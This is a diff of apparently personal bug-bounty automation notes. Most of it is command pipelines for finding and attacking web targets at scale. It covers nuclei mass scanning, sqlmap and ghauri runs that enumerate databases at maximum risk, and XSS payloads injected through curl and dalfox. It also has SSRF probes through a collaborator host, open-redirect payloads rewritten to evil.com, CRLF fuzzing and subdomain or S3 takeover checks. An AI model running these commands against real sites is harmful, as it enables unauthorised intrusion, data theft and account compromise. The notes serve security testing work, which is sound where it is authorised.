@@ -1,26 +1,132 @@
 
 
 
-1.burp
+1.burp =>do research
 2.k_automation
-3.nuclei
-4.cves
+./testing.sh (ensure we have live.txt)
+
+3.nuclei => do research
+4.cves =>do research 
 5.individual testing =>see below
 
 
+about jaeles
+
+nucleifuzzer =
+nf -d example.com
+nf -f file.txt
 
 
 
-https://github.com/0xKayala/NucleiFuzzer
+-------------------------------------------------------------------1.AUTOMATION RUN BASED ON DOMAIN,SUBDOMAIN--------------------------------------------------------------------
+1.run on domain name and subdomains names:
 
----------------------------------------------------------------------------------open:
+scan specific target:
+nuclei -target "https://target.com" -t cves   (or) nuclei -target "https://target.com" -t /nuclei-templates/cves -o out.txt
+nuclei -u <subdomain or url> -tags aem (FOR AEM)
+nuclei -l live_subs_domain.com.txt -rl 10 -bs 2 -c 2 -as -silent -s critical,high,medium
+
+scan all templates on single target:
+nuclei -target "https://target.com" -t /nuclei-templates/ -o out.txt
+
+mass hunting:
+cat alldomains.txt | nuclei -t /nuclei-templates/  -o out.txt
+
+
+----------------------------------2.AUTOMATION RUN ON SPECIFIC URLS ACC TO VULNERABILITY : (RUN SPCIFIC TEMPLATES ALSO RUN ALL TEMPLATES...)----------------------------------------
+
+
+2..GETTING PARAMETERIZED URLS:
+
+	1.ParamSpider (Spidering + Regex):
+	getting urls: paramspider -l subdomains.txt --exclude=php,jpg | tee -a all_params.txt
+	       Regex: cat all_urls.txt | grep -E '\?[^=]+=.+$' >all.txt (will identify all parametrized outputs)
+
+	2.use lostfuzzer.sh:
+	use ./lostfuzzer.sh to collect parameterized urls and save into loxs_param.txt
+
+combining all prams_urls:
+cat all_params.txt loxs_param >> all_params.txt and use this in sql,xss,openredirection testing
+
+
+# Categorizing parameters into separate files for further manual testing:
+
+grep -Ei 'xss|callback|token' all_params.txt all_urls.txt > xss.txt  
+grep -Ei 'id=|select=|union=|query=|search=' all_params.txt all_urls.txt > sqli.txt  
+grep -Ei 'redirect=|url=|next=|return=' all_params.txt all_urls.txt > openredir.txt 
+
+
+GENERAL BUGS AUTOMATION: (input: filtered_params_urls)
+
+	=>for crlf:            cat crlf.txt | nuclei -t /prsnl/crlf.yaml
+	=>for iis:             cat iis.txt | nuclei -t /prsnl/iis.yaml,    for exploitation use #shortscan 
+	=>for git:             cat git.txt | nuclei -t prsnl/gitExposed.yaml
+	=>for cors:            cat cors.txt | nuclei -t /prsnl/cors.yaml
+
+
+SQLI,XSS AND OD AUTOMATION:
+
+use paramspider to find parametrs based requests
+use grep to filter urls containng ?,= etc...
+cat all_urls.txt | grep '?' | tee params.txt
+cat all_urls.txt | grep = | tee params.txt
+
+
+#FINDING HIDDEN PARAMS
+	cat params.txt | xargs -I % arjun -u "%" -oT hidden_params.txt
+
+### **SQL Injection (SQLi) Automation**
+
+
+
+        1.using sqlmap:
+	sqlmap -m params.txt --batch --random-agent --level=5 --risk=3 --dbs
+	sqlmap -m urls.sqli --level 5 --risk 3 --batch --dbs --tamper=between
+		
+	2.nuclei dast scanner:
+	=>collect all urls using gdork eg:.phpid= or using wayback..
+	=>use grep to filter params and run nuclei , cat test.txt | grep -E '\?[^=]+=.+$' | nuclei -t /errsqli.yam -dast
+	=>to exploit use ,ghauri -m sqli_urls.txt --batch --dbs --level=3 --threads=10
+	
+	3.nuclei: (input: filtered_params_urls)
+	=>for sql:  cat sql.txt | nuclei -t /prsnl/errsqli.yaml
+	=>for sql:  cat sql.txt | nuclei -t /prsnl/timesqli.yaml -dast
+	
+
+### **Cross-Site Scripting (XSS) Automation**
+
+
+
+	1.using parameterized output: (input: filtered_params_urls)
+	cat urls.txt | grep -E '\?[^=]+=.+$' | sed 's/\(.*=\).*/\1<script>alert(1)<\/script>/' | xargs -I {} curl -s -k {}
+
+
+	2.using dalfox. (input: filtered_params_urls)
+	dalfox file params.txt --deep --blind xss.yourdomain.com
+	dalfox -b <payload> file urls.xss
+
+
+	3.paramspider -d target.com | qsreplace  '"/><script>confirm(1)</script>' > xss.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" 
+	| grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+
+### **Server-Side Request Forgery (SSRF) Automation**
+
+
+        1.using qsreplace and ffuf : (input: filtered_params_urls)
+	# Replace all query parameters with Burp Collaborator URL for SSRF detection
+	cat params_url.ssrf | qsreplace <burp-collab> | tee ssrf_urls_ffuf
+	# Perform SSRF scanning using ffuf
+	ffuf -c -w ssrf_urls_ffuf -u FUZZ
+	
+	2.using nuclei: (input: filtered_params_urls)
+		=>for blind ssrf:  cat or.txt | nuclei -t /prsnl/blind-ssrf.yaml  --retiries 2 --dast
+		=>for ssrf:   cat or.txt | nuclei -t /prsnl/response-ssrf.yaml --retiries 2 --dast
+
+
+### **Open Redirect (OD) Automation**
+
 getting urls:
 cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
-
-
-python3 linkfinder.py -i https://example.com -o cli
-
-https://virustotal.com/vtapi/v2/domain/report?apikey=[YOUR_API_KEY]&domain=target.com
 
 
 usimg httpx:
@@ -58,159 +164,13 @@ cat urls.txt | gf redirect | while read url; do
 done
 
 
+	1.using curl:
+	cat params_urls.txt | grep -E '\?[^=]+=.+$' | sed 's/\(.*=\).*/\1https:\/\/evil.com/' | xargs -I {} curl -s -k {}
+	2.using nuclei: (input: filtered_params_urls)
+	cat or.txt | nuclei -t /prsnl/openredirect.yaml --retries 2
 
 
 
--------------------crlf--------------------------
-using crlfi:
-crlfi -i domains.txt
-
-using crlfuzz:
-crlfuzz -l domains.txt | tee -a output.txt
-crlfuzz -l urls.txt | tee -a output.txt
-
-
-using crlfsuite:
-crlfsuite -iT domains.txt
-
-
-use nuclei
-nuclei-l domains.txt -tags crlf
-nuclei -l urls.txt -tags cors
-
-
-
-## Automation Guide for Nuclei Scanning
-
-### **1. Scanning Domains and Subdomains**
-
-* **Scan Specific Target:**
-
-  ```bash
-  nuclei -target "https://target.com" -t cves -o out.txt
-  nuclei -target "https://target.com" -t /nuclei-templates/cves -o out.txt
-  ```
-
-* **Scan Specific Tags (e.g., AEM):**
-
-  ```bash
-  nuclei -u <subdomain or url> -tags aem
-  ```
-
-* **Scan Live Subdomains:**
-
-  ```bash
-  nuclei -l live_subs_domain.com.txt -rl 10 -bs 2 -c 2 -as -silent -s critical,high,medium
-  ```
-
-* **Scan All Templates on a Single Target:**
-
-  ```bash
-  nuclei -target "https://target.com" -t /nuclei-templates/ -o out.txt
-  ```
-
-* **Mass Hunting:**
-
-  ```bash
-  cat alldomains.txt | nuclei -t /nuclei-templates/ -o out.txt
-  ```
-
----
-
-### **2. Vulnerability-Specific Automation**
-
-* **General Bugs:**
-
-  ```bash
-  cat crlf.txt | nuclei -t /prsnl/crlf.yaml
-  cat iis.txt | nuclei -t /prsnl/iis.yaml
-  cat git.txt | nuclei -t /prsnl/gitExposed.yaml
-  cat cors.txt | nuclei -t /prsnl/cors.yaml
-  ```
-
-* **Filter Parameters for SQLi, XSS, and Open Redirects:**
-
-  ```bash
-  cat all_urls.txt | grep '?' | tee params.txt
-  cat all_urls.txt | grep '=' | tee params.txt
-  ```
-
-* **Find Hidden Parameters:**
-
-  ```bash
-  cat params.txt | xargs -I % arjun -u "%" -oT hidden_params.txt
-  ```
-
----
-
-### **SQL Injection (SQLi) Automation**
-
-* **Using SQLMap:**
-
-  ```bash
-  sqlmap -m params.txt --batch --random-agent --level=5 --risk=3 --dbs
-  sqlmap -m urls.sqli --level 5 --risk 3 --batch --dbs --tamper=between
-  ```
-
-* **Using Nuclei for SQLi Detection:**
-
-  ```bash
-  cat params.txt | grep -E '\?[^=]+=.+$' | nuclei -t /prsnl/errsqli.yaml -dast
-  ```
-
-* **For Exploitation:**
-
-  ```bash
-  ghauri -m sqli_urls.txt --batch --dbs --level=3 --threads=10
-  ```
-
----
-
-### **Cross-Site Scripting (XSS) Automation**
-
-* **Using Curl:**
-
-  ```bash
-  cat urls.txt | grep -E '\?[^=]+=.+$' | sed 's/\(.*=\).*/\1<script>alert(1)<\/script>/' | xargs -I {} curl -s -k {}
-  ```
-
-* **Using Dalfox:**
-
-  ```bash
-  dalfox file params.txt --deep --blind xss.yourdomain.com
-  dalfox -b <payload> file urls.xss
-  ```
-
-* **Using Paramspider and Curl:**
-
-  ```bash
-  paramspider -d target.com | qsreplace '"/><script>confirm(1)</script>' > xss.txt
-  while read host; do
-    curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host Vulnerable" || echo "$host Not Vulnerable"
-  done < xss.txt
-  ```
-
----
-
-### **Server-Side Request Forgery (SSRF) Automation**
-
-* **Using Qsreplace and FFUF:**
-
-  ```bash
-  cat params_url.ssrf | qsreplace <burp-collab> | tee ssrf_urls_ffuf
-  ffuf -c -w ssrf_urls_ffuf -u FUZZ
-  ```
-
-* **Using Nuclei:**
-
-  ```bash
-  cat or.txt | nuclei -t /prsnl/blind-ssrf.yaml --retries 2 --dast
-  cat or.txt | nuclei -t /prsnl/response-ssrf.yaml --retries 2 --dast
-  ```
-
----
-
-### **Open Redirect (OD) Automation**
 
 * **Using Curl:**
 
@@ -229,25 +189,41 @@ nuclei -l urls.txt -tags cors
   * `anew` ensures no duplicates are present in `open_redirects_payloads.txt`.
   * Nuclei will use `openredirect.yaml` to check for open redirect vulnerabilities.
 
----
-
-This improved guide will help you manage and automate your scans more efficiently. Let me know if you'd like additional tweaks!
 
 
-cors:
-nuclei -l domains.txt -tags cors
+#automate s3
+s3:
+nuclei -t s3-bucket-takeover.yaml -u http://<bucket-name>.s3.amazonaws.com
 
-subdomain takeover:
+
+#rsubdomain takeover:
 using nuclei:
 nuclei -l domains.txt -t /http/takeovers/ -o out.txt
 nuclei -l hosts.txt -t subdomain-takeover-detect-all-takeovers.yaml
-
 using subzy:
 subzy run -targets domains.txt
 
-wordpress:
+
+#automating wordpress:
+
 nuclei -u https://target.com -t wordpress/
 cat alive.txt | nuclei -t ~/nuclei-templates/technologies/wordpress-detect.yaml
 
-s3:
-nuclei -t s3-bucket-takeover.yaml -u http://<bucket-name>.s3.amazonaws.com
+
+#automating cors:
+nuclei -l domains.txt -tags cors
+
+#-------------------crlf--------------------------
+using crlfi:
+crlfi -i domains.txt
+
+using crlfuzz:
+crlfuzz -l domains.txt | tee -a output.txt
+crlfuzz -l urls.txt | tee -a output.txt
+
+
+using crlfsuite:
+crlfsuite -iT domains.txt
+
+
+about ax framework,ax tool for automation
